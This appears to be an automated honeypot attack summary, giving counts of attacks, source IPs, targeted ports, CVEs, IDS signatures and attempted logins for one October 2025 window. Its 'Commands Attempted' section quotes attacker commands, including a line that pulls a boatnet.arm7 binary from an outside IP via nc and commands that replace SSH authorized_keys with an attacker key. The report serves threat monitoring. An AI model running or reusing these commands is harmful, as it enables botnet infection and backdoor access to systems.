
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-13T16:01:36Z
**Timeframe:** 2025-10-13T15:20:01Z to 2025-10-13T16:00:01Z

**Files Used to Generate Report:**
- agg_log_20251013T152001Z.json
- agg_log_20251013T154002Z.json
- agg_log_20251013T160001Z.json

## Executive Summary

This report summarizes 7886 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie honeypot. The most targeted service was SIP (port 5060), followed by SSH (port 22). Several CVEs were detected, with CVE-2006-0189 and CVE-2022-27255 being the most frequent. Attackers attempted a variety of commands, including reconnaissance and attempts to download and execute malware.

## Detailed Analysis

### Attacks by Honeypot

- **Cowrie:** 4843
- **Sentrypeer:** 1510
- **Suricata:** 889
- **Honeytrap:** 392
- **Dionaea:** 47
- **Redishoneypot:** 44
- **Tanner:** 44
- **Adbhoney:** 20
- **H0neytr4p:** 16
- **Mailoney:** 25
- **Ciscoasa:** 17
- **Miniprint:** 10
- **Dicompot:** 6
- **Heralding:** 3
- **ElasticPot:** 4
- **Honeyaml:** 4
- **Ipphoney:** 2

### Top Attacking IPs

- **129.212.187.19:** 1008
- **165.22.53.243:** 896
- **45.236.188.4:** 474
- **185.243.5.146:** 445
- **172.86.95.98:** 318
- **172.86.95.115:** 308
- **62.141.43.183:** 324
- **156.232.94.55:** 196
- **193.122.200.89:** 168
- **79.168.139.28:** 219

### Top Targeted Ports/Protocols

- **5060:** 1510
- **22:** 846
- **23:** 78
- **UDP/5060:** 53
- **6379:** 44
- **80:** 46
- **443:** 28
- **TCP/22:** 33
- **TCP/80:** 18
- **TCP/1433:** 21

### Most Common CVEs

- **CVE-2006-0189:** 24
- **CVE-2022-27255 CVE-2022-27255:** 24
- **CVE-2002-0013 CVE-2002-0012:** 10
- **CVE-2005-4050:** 2
- **CVE-2002-0013 CVE-2002-0012 CVE-1999-0517:** 2
- **CVE-2006-2369:** 1
- **CVE-2018-10562 CVE-2018-10561:** 1
- **CVE-2013-7471 CVE-2013-7471:** 1

### Commands Attempted by Attackers

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `cd /data/local/tmp; su 0 mkdir .wellover222 || mkdir .wellover222; cd .wellover222; toybox nc 84.200.81.239 2228 > boatnet.arm7; ...`

### Signatures Triggered

- **ET DROP Dshield Block Listed Source group 1:** 248
- **ET SCAN NMAP -sS window 1024:** 122
- **ET INFO Reserved Internal IP Traffic:** 59
- **ET EXPLOIT Realtek eCos RSDK/MSDK Stack-based Buffer Overflow Attempt Inbound (CVE-2022-27255):** 24
- **ET VOIP SIP UDP Softphone INVITE overflow:** 24

### Users / Login Attempts

- **guest/55**
- **user/44**
- **user/user2014**
- **root/K3FDf3hpd6Fh**
- **debian/debian2020**
- **nobody/qwerty123456**
- **guest/guest2010**
- **test/p@ssw0rd**
- **config/config444**
- **test/password321**

### Files Uploaded/Downloaded

- **11**
- **fonts.gstatic.com**
- **css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&amp;subset=latin%2Clatin-ext**
- **ie8.css?ver=1.0**
- **html5.js?ver=3.7.3**

### HTTP User-Agents

- None observed.

### SSH Clients and Servers

- None observed.

### Top Attacker AS Organizations

- None observed.

## Key Observations and Anomalies

- A significant number of attacks are directed at SIP and SSH services, indicating a focus on VoIP and remote access vectors.
- The repeated attempts to download and execute `boatnet.arm` variants suggest a campaign to enlist devices into an IoT botnet.
- The presence of commands to manipulate SSH authorized_keys files is a common technique for establishing persistent access.

